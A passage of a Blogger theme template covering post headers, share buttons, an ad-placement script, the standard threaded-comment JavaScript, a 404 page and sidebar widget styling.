  <b:if cond='data:x==1'> <a expr:href='data:label.url + &quot;?max-results=5&quot;' rel='tag nofollow'><data:label.name/></a></b:if> 
  
  </b:loop>
        </b:if>
       </span>
<span class='meta-com'><i aria-hidden='true' class='fa fa-comments'/><a class='comments-link' expr:href='data:post.addCommentUrl'><span><b:if cond='data:post.numComments == 0'><b>0</b> <b:else/><b:if cond='data:post.numComments == 1'><b>1 </b> <b:else/> <data:post.numComments/></b:if></b:if></span> Comments</a></span>
</div>
           </div>
                            </b:if>
                          </b:if>
    <b:if cond='data:blog.pageType == &quot;item&quot;'>
     &lt;div itemprop=&#39;blogPost&#39; itemscope=&#39;itemscope&#39; itemtype=&#39;http://schema.org/BlogPosting&#39;&gt;
      <meta expr:content='data:post.firstImageUrl' itemprop='image'/>
<meta content='data:post.link : data:post.url' expr:itemid='data:post.link' itemType='https://schema.org/WebPage' itemprop='mainEntityOfPage' itemscope='itemscope'/>
<meta expr:content='data:post.timestamp' itemprop='datePublished'/>
<meta expr:content='data:post.lastUpdatedISO8601' itemprop='dateModified'/>
<div itemprop='publisher' itemscope='' itemtype='https://schema.org/Organization'>
<div itemprop='logo' itemscope='' itemtype='https://schema.org/ImageObject' style='display:none;'>
<img src='http://4.bp.blogspot.com/-EZutih0wkR0/U4dd5FH-2tI/AAAAAAAAC_k/01N2EYfcaFo/s1600/sidebar-300+(2).png'/>
<meta content='http://4.bp.blogspot.com/-EZutih0wkR0/U4dd5FH-2tI/AAAAAAAAC_k/01N2EYfcaFo/s1600/sidebar-300+(2).png' itemprop='url'/>
<meta content='300' itemprop='width'/>
<meta content='200' itemprop='height'/>
</div>
<meta expr:content='data:blog.title' itemprop='name'/>
</div>
    </b:if>
    <div class='post-header'>
 <b:if cond='data:blog.pageType == &quot;item&quot;'>
<div class='top-image'>
<b:if cond='data:post.thumbnailUrl'>
<a class='post-thumb' expr:href='data:post.url' expr:title='data:post.title'>
<img expr:alt='data:post.title' expr:src='data:post.firstImageUrl' expr:title='data:post.title'/>
  </a>
 <b:else/>
<a class='post-thumb' expr:href='data:post.url' expr:title='data:post.title'>
                 <img class='item_thumb post-thumbnail ' expr:alt='data:post.title' src='http://3.bp.blogspot.com/-Yw8BIuvwoSQ/VsjkCIMoltI/AAAAAAAAC4c/s55PW6xEKn0/s1600-r/nth.png'/>
                 </a></b:if>
                   </div>
               
        <b:if cond='data:post.title'>
      <div class='post-head'><h1 class='post-title entry-title' itemprop='name headline'>
      <b:if cond='data:post.link'>
        <a expr:href='data:post.link'><data:post.title/></a>
      <b:else/>
        <b:if cond='data:post.url'>
          <b:if cond='data:blog.url != data:post.url'>
            <a expr:href='data:post.url'><data:post.title/></a>
          <b:else/>
            <data:post.title/>
          </b:if>
        <b:else/>
          <data:post.title/>
        </b:if>
      </b:if>
        </h1></div>
    </b:if>
        <div class='post-meta'>
<div class='post-meta-wrap'>
 <span class='auth-meta' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'> <i class='fa fa-user'/> <a class='g-profile' expr:href='data:post.authorProfileUrl' expr:title='data:post.author' rel='author'>
                        <span itemprop='name'><data:post.author/></span></a> </span>
<span class='pub-meta'><i class='fa fa-calendar-o'/>
<abbr class='published timeago' expr:title='data:post.timestampISO8601'><data:post.timestamp/></abbr></span>
<span class='post-labels'>
<i aria-hidden='true' class='fa fa-folder-open'/>
        <b:if cond='data:post.labels'>
         <b:loop index='x' values='data:post.labels' var='label'>

    <b:if cond='data:x==0'> <a expr:href='data:label.url + &quot;?max-results=5&quot;' rel='tag nofollow'><data:label.name/></a> <b>,</b> </b:if>
  <b:if cond='data:x==1'> <a expr:href='data:label.url + &quot;?max-results=5&quot;' rel='tag nofollow'><data:label.name/></a></b:if> 
  
  </b:loop>
        </b:if>
       </span>
<span class='meta-com'><i aria-hidden='true' class='fa fa-comments'/><a class='comments-link' expr:href='data:post.addCommentUrl'><span><b:if cond='data:post.numComments == 0'><b>0</b> <b:else/><b:if cond='data:post.numComments == 1'><b>1 </b> <b:else/> <data:post.numComments/></b:if></b:if></span> Comments</a></span>
        </div></div>
   </b:if>
  <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
    <b:if cond='data:post.title'>
      <div class='post-head'><h1 class='post-title entry-title' itemprop='name'>
      <b:if cond='data:post.link'>
        <a expr:href='data:post.link'><data:post.title/></a>
      <b:else/>
        <b:if cond='data:post.url'>
          <b:if cond='data:blog.url != data:post.url'>
            <a expr:href='data:post.url'><data:post.title/></a>
          <b:else/>
            <data:post.title/>
          </b:if>
        <b:else/>
          <data:post.title/>
        </b:if>
      </b:if>
        </h1></div>
    </b:if>
    </b:if>
   
    </div>

    <!-- Then use the post body as the schema.org description, for good G+/FB snippeting. -->
    <article>
         <b:if cond='data:blog.pageType != &quot;item&quot;'>
         <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                  <div class='date-header-post'>
                    <div class='resumo'><span><div expr:id='&quot;summary&quot; + data:post.id'><data:post.body/></div>
<script type='text/javascript'>createSnippet(&quot;summary<data:post.id/>&quot;);</script></span></div>
                      <div style='clear: both;'/>

                      </div>
<div class='second-meta'>
<div class='share-box'>
          
              
            

               <div class='share-art'> 
<a class='fac-art' expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-facebook'/><span class='resp_del'> Facebook</span></a>

<a class='twi-art' expr:href='&quot;http://twitter.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-twitter'/><span class='resp_del2'> Twitter</span></a>

<a class='goo-art' expr:href='&quot;https://plus.google.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-google-plus'/><span class='resp_del3'> Google+</span></a>


<a class='read-art' expr:href='data:post.url'>Read More <i class='fa fa-angle-double-right'/></a>


</div>
        
         </div>

      </div>
            <b:else/>
       <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
         <meta expr:content='data:post.snippet' name='twitter:description'/>
         <data:post.body/>
       </div>
          </b:if>
          <b:else/>
       <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
         <meta expr:content='data:post.snippet' name='twitter:description'/>

<div id='adsense-content' style='display: inline-block;float: left;margin:0 15px 15px 0px'>
<a href='#'>
<img src='http://4.bp.blogspot.com/-EZutih0wkR0/U4dd5FH-2tI/AAAAAAAAC_k/01N2EYfcaFo/s1600/sidebar-300+(2).png'/>
</a>
</div>
        <div id='adsense-target'><data:post.body/></div>
<script type='text/javascript'>
function insertAfter(addition,target) {
var parent = target.parentNode;
if (parent.lastChild == target) {
parent.appendChild(addition); 
} else {
parent.insertBefore(addition,target.nextSibling);
}
}
var adscont = document.getElementById(&quot;adsense-content&quot;);
var target = document.getElementById(&quot;adsense-target&quot;);
var linebreak = target.getElementsByTagName(&quot;br&quot;);
if (linebreak.length &gt; 0){
insertAfter(adscont,linebreak[0]);
}
</script>
       </div>
         </b:if>
     </article>

   

    <div class='post-footer'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<div class='share-box'>
          
              
           
 
          <h8 class='share-title'>Share This:</h8>
               <div class='share-art'> 
<a class='fac-art' expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-facebook'/><span class='resp_del'> Facebook</span></a>

<a class='twi-art' expr:href='&quot;http://twitter.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-twitter'/><span class='resp_del2'> Twitter</span></a>

<a class='goo-art' expr:href='&quot;https://plus.google.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-google-plus'/><span class='resp_del3'> Google+</span></a>

<a class='pin-art' expr:href='&quot;http://pinterest.com/pin/create/button/?url=&quot; + data:post.url + &quot;&amp;media=&quot; + data:post.firstImageUrl + &quot;&amp;description=&quot; + data:post.snippet' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-pinterest'/><span class='resp_del4'> Pinterest</span></a>  

<a class='lin-art' expr:href='&quot;http://www.linkedin.com/shareArticle?url=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-linkedin-square'/><span class='resp_del5'> Linkedin</span></a>

<whatsapp expr:href='data:post.url' expr:text='data:post.title'/>
<a class='wat-art' expr:href='&quot;whatsapp://send?text=&quot; + data:post.title + &quot; &gt;&gt; &quot; + data:post.url' rel='nofollow' target='_blank'><i class='fa fa-whatsapp'/><span class='resp_del5'> Whatsapp</span></a>

</div>
        
         </div>
            
     
             
  
      <div style='clear:both'/>  
 
<div id='related-posts'>

        <b:if cond='data:post.labels'>
          <b:loop values='data:post.labels' var='label'>
            <b:if cond='data:label.isLast == &quot;true&quot;'>
              <data:label.name/>
            </b:if>
          </b:loop>
        </b:if>
      </div>
 <div style='clear:both'/>    
<div class='post-pager' id='post-pager'>
    <b:if cond='data:newerPageUrl'>
      <span id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'/>
      </span>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <span id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'/>
      </span>
    </b:if>

  </div>  
   </b:if>
    <div class='post-footer-line post-footer-line-1'>
      <span class='post-author vcard'>
        <b:if cond='data:top.showAuthor'>
          <data:top.authorLabel/>
            <b:if cond='data:post.authorProfileUrl'>
              <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                <a class='g-profile' expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                  <span itemprop='name'><data:post.author/></span>
                </a>
              </span>
            <b:else/>
              <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                <span itemprop='name'><data:post.author/></span>
              </span>
            </b:if>
        </b:if>
      </span>

      <span class='post-timestamp'>
        <b:if cond='data:top.showTimestamp'>
          <data:top.timestampLabel/>
          <b:if cond='data:post.url'>
            <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
            <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'><data:post.timestamp/></abbr></a>
          </b:if>
        </b:if>
      </span>

      <span class='reaction-buttons'>
        <b:if cond='data:top.showReactions'>
          <table border='0' cellpadding='0' cellspacing='0' width='100%'><tr>
            <td class='reactions-label-cell' nowrap='nowrap' valign='top' width='1%'>
              <span class='reactions-label'>
              <data:top.reactionsLabel/></span>&#160;</td>
            <td><iframe allowtransparency='true' class='reactions-iframe' expr:src='data:post.reactionsUrl' frameborder='0' name='reactions' scrolling='no'/></td>
           </tr></table>
        </b:if>
      </span>

      <span class='post-comment-link'>
        <b:include cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                          and data:post.allowComments' data='post' name='comment_count_picker'/>
      </span>

       <!-- backlinks -->
       <span class='post-backlinks post-comment-link'>
         <b:if cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                      and data:post.showBacklinks'>
           <a class='comment-link' expr:href='data:post.url + &quot;#links&quot;'><data:top.backlinkLabel/></a>
         </b:if>
       </span>

      <span class='post-icons'>
        <!-- email post links -->
        <b:if cond='data:post.emailPostUrl'>
          <span class='item-action'>
          <a expr:href='data:post.emailPostUrl' expr:title='data:top.emailPostMsg'>
            <img alt='' class='icon-action' height='13' src='//img1.blogblog.com/img/icon18_email.gif' width='18'/>
          </a>
          </span>
        </b:if>

        <!-- quickedit pencil -->
        <b:include data='post' name='postQuickEdit'/>
      </span>

      <!-- share buttons -->
      <div class='post-share-buttons goog-inline-block'>
        <b:include cond='data:post.sharePostUrl' data='post' name='shareButtons'/>
      </div>

      </div>

      <div class='post-footer-line post-footer-line-2'>
      <span class='post-labels'>
        <b:if cond='data:post.labels'>
          <data:postLabelsLabel/>
          <b:loop values='data:post.labels' var='label'>
            <a expr:href='data:label.url' rel='tag'><data:label.name/></a><b:if cond='not data:label.isLast'>,</b:if>
          </b:loop>
        </b:if>
      </span>
      </div>

      <div class='post-footer-line post-footer-line-3'>
      <span class='post-location'>
        <b:if cond='data:top.showLocation'>
          <b:if cond='data:post.location'>
            <data:postLocationLabel/>
            <a expr:href='data:post.location.mapsUrl' target='_blank'><data:post.location.name/></a>
          </b:if>
        </b:if>
      </span>
      </div>
      <b:if cond='data:post.authorAboutMe'>
        <div class='author-profile' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
          <b:if cond='data:post.authorPhoto.url'>
            <img expr:src='data:post.authorPhoto.url' itemprop='image' width='50px'/>
          </b:if>
          <div>
            <a class='g-profile' expr:href='data:post.authorProfileUrl' itemprop='url' rel='author' title='author profile'>
              <span itemprop='name'><data:post.author/></span>
            </a>
          </div>
          <span itemprop='description'><data:post.authorAboutMe/></span>
        </div>
      </b:if>
    </div>
   <b:if cond='data:blog.pageType == &quot;item&quot;'>
  &lt;/div&gt;
    </b:if>
  </div>
</b:includable>
       <b:includable id='postQuickEdit' var='post'>
  <b:if cond='data:post.editUrl'>
    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
      <a expr:href='data:post.editUrl' expr:title='data:top.editPostMsg'>
        <img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
      </a>
    </span>
  </b:if>
</b:includable>
       <b:includable id='shareButtons' var='post'>
  <b:if cond='data:top.showEmailButton'><a class='goog-inline-block share-button sb-email' expr:href='data:post.sharePostUrl + &quot;&amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'><span class='share-button-link-text'><data:top.emailThisMsg/></span></a></b:if><b:if cond='data:top.showBlogThisButton'><a class='goog-inline-block share-button sb-blog' expr:href='data:post.sharePostUrl + &quot;&amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'><span class='share-button-link-text'><data:top.blogThisMsg/></span></a></b:if><b:if cond='data:top.showTwitterButton'><a class='goog-inline-block share-button sb-twitter' expr:href='data:post.sharePostUrl + &quot;&amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToTwitterMsg/></span></a></b:if><b:if cond='data:top.showFacebookButton'><a class='goog-inline-block share-button sb-facebook' expr:href='data:post.sharePostUrl + &quot;&amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToFacebookMsg/></span></a></b:if><b:if cond='data:top.showPinterestButton'><a class='goog-inline-block share-button sb-pinterest' expr:href='data:post.sharePostUrl + &quot;&amp;target=pinterest&quot;' expr:title='data:top.shareToPinterestMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToPinterestMsg/></span></a></b:if><b:if cond='data:top.showPlusOne'><div class='goog-inline-block google-plus-share-container'><data:post.googlePlusShareTag/></div></b:if>
</b:includable>
       <b:includable id='status-message'>
  <b:if cond='data:navMessage'>
  <div class='status-msg-wrap'>
    <div class='status-msg-body'>
      <data:navMessage/>
    </div>
    <div class='status-msg-border'>
      <div class='status-msg-bg'>
        <div class='status-msg-hidden'><data:navMessage/></div>
      </div>
    </div>
  </div>
  <div style='clear: both;'/>
<b:if cond='data:blog.pageType == &quot;error_page&quot;'>
  <div class='post-404'>
<div class='actions-404'>
<div class='ops-404'><span>Oops;</span> Sorry, but the page you were trying to view does not exist.
                        </div>
<div class='title-404'>404</div>
<div class='link-404'>
<a href='/'><i class='fa fa-car'/>
<trans>Back to Home</trans></a>
</div></div>
</div>
<style>
.post-404 {
    padding-top: 40px;
    padding-bottom: 60px;
}
.actions-404 {
    width: 100%;
    float: right;
    text-align: center;
}
.ops-404 {
    width: 50%;
    margin: 0 auto;
    font-size: 26px;
    font-weight: 400;
font-family: &#39;Montserrat&#39;, sans-serif;
}
.ops-404 span {
    font-weight: 700;
}
.title-404 {
    font-size: 200px;
    font-weight: 700;
    line-height: 1.1;
    color:$maincolor;
}
.link-404 {
    font-size: 18px;
    padding-top: 20px;
    padding-bottom: 50px;
}
#blog-pager, #sidebar-wrapper,.status-msg-wrap {
    display: none;
}
.status-msg-border {
         border: 0 !important;
       }

       .status-msg-bg {
         background-color: #fff;
       }
#main-wrapper {
width: 100%;
    max-width: 100%;
}
#main-post-sec {
    max-width: 100%;
}
#mini-sidebar-wrapper {
    display: none;
}
</style>
      </b:if>
  </b:if>
</b:includable>
       <b:includable id='threaded-comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
    </script>
  </div>
</b:includable>
       <b:includable id='threaded_comment_js' var='post'>
  <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>

  <script type='text/javascript'>
    (function() {
      var items = <data:post.commentJso/>;
      var msgs = <data:post.commentMsgs/>;
      var config = <data:post.commentConfig/>;

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          replybox.src = '';
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
  </script>
</b:includable>
       <b:includable id='threaded_comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <h4><data:post.commentLabelFull/>:</h4>

    <div class='comments-content'>
      <b:include cond='data:post.embedCommentForm' data='post' name='threaded_comment_js'/>
      <div id='comment-holder'>
         <data:post.commentHtml/>
      </div>
    </div>

    <p class='comment-footer'>
      <b:if cond='data:post.allowNewComments'>
        <b:include data='post' name='threaded-comment-form'/>
      <b:else/>
        <data:post.noNewCommentsText/>
      </b:if>
    </p>

    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
      <b:include cond='data:post.showBacklinks' data='post' name='backlinks'/>
    </div>
    </div>
  </div>
</b:includable>
     </b:widget>
   </b:section>    
      </div>

  <div id='sidebar-wrapper' itemscope='itemscope' itemtype='http://schema.org/WPSideBar'>
  <b:section class='sidebar ty-trigger' id='sidebar' preferred='yes'>
    <b:widget id='HTML4' locked='false' title='About Me' type='HTML'>
      <b:widget-settings>
        <b:widget-setting name='content'>&lt;center&gt;&lt;div class=&quot;aboutme-content&quot;&gt;&lt;img alt=&quot;test&quot; src=&quot;https://lh6.googleusercontent.com/proxy/3mSd1hJNQKLIRA-djYoaJZHWqNOLEkyHUPiWBzhUnSTnyeYdaMtG0iUxUoctVgEyDrpg33GYAw0D4xJsND55Ej0R6o4NGjHhhVMOidWNzLptndg=s0-d&quot; /&gt;			&lt;br /&gt;&lt;p&gt;Duis autem vel eum iriure dolor in hendrerit in vulputate velit esse molestie consequat, vel illum dolore eu feugiat nulla&lt;/p&gt;&lt;/div&gt;&lt;/center&gt;
&lt;style&gt;
.aboutme-content img {
    border-radius: 50%;
}
&lt;/style&gt;</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
    </b:widget>
    <b:widget id='HTML2' locked='false' title='Social' type='HTML' version='1'>
      <b:widget-settings>
        <b:widget-setting name='content'>&lt;style&gt;
/* Social Counter
--------------------------------------*/
li.social_item-wrapper {
float: left;
width: 48%;
text-align: center;
margin-right: 4% !important;
margin-bottom: 10px !important;
color: #fff;
}
#sidebar .widget {
margin-bottom: 35px;
}
a.social_item {
position: relative;
display: block;
height: 60px;
line-height: 60px;
overflow: hidden;
}
.social_item-wrapper:nth-child(2n+2) {
margin-right: 0 !important;
}
.social_icon {
float: left;
line-height: 60px;
width: 41px;
font-size: 1.3rem;
}
a.social_item.social_facebook {
background: #3F5B9B;
}
.fa-facebook.social_icon {
background: #2E4372;
}
li.social_item-wrapper:hover .fa-facebook.social_icon {
background: #3F5B9B;
}
li.social_item-wrapper:hover .social_facebook {
background: #2E4372;
}
a.social_item.social_twitter {
background: #1C97DE;
}
.fa-twitter.social_icon {
background: #1571A5;
}
li.social_item-wrapper:hover .fa-twitter.social_icon {
background: #1C97DE;
}
li.social_item-wrapper:hover .social_twitter {
background: #1571A5;
}
a.social_item.social_youtube {
background: #E22020;
}
.fa-youtube.social_icon {
background: #B31919;
}
li.social_item-wrapper:hover .fa-youtube.social_icon {
background: #E22020;
}
li.social_item-wrapper:hover .social_youtube {
background: #B31919;
}
a.social_item.social_dribbble {
background: #E82159;
}
.fa-dribbble.social_icon {
background: #B51A45;
}
li.social_item-wrapper:hover .fa-dribbble.social_icon {
background: #E82159;
}
li.social_item-wrapper:hover .social_dribbble {
background: #B51A45;
}
a.social_item.social_rss {
background: #E86321;
}
.fa-rss.social_icon {
background: #C2521B;
}
li.social_item-wrapper:hover .fa-rss.social_icon {
background: #E86321;
}
li.social_item-wrapper:hover .social_rss {
background: #C2521B;
}
a.social_item.social_google-plus {
background: #E82C2C;
}
.fa-google-plus.social_icon {
background: #BF2424;
}
li.social_item-wrapper:hover .fa-google-plus.social_icon {
background: #E82C2C;
}
li.social_item-wrapper:hover .social_google-plus {
background: #BF2424;
}
a.social_item.social_linkedin {
background: #0275B6;
}
.fa-linkedin.social_icon {
background: #02669E;
}
li.social_item-wrapper:hover .fa-linkedin.social_icon {
background: #0275B6;
}
li.social_item-wrapper:hover .social_linkedin {
background: #02669E;
}
a.social_item.social_instagram {
background: #8E714D;
}
.fa-instagram.social_icon {
background: #6F583C;
}
li.social_item-wrapper:hover .fa-instagram.social_icon {
background: #8E714D;
}
li.social_item-wrapper:hover .social_instagram {
background: #6F583C;
}
a.social_item.social_pinterest {
background: #CA2027;
}
.fa-pinterest.social_icon {
background: #AB1B21;
}
li.social_item-wrapper:hover .fa-pinterest.social_icon {
background: #CA2027;
}
li.social_item-wrapper:hover social_pinterest {
background: #AB1B21;
}
ul.social-counter a {
color: #fff;
}
&lt;/style&gt;
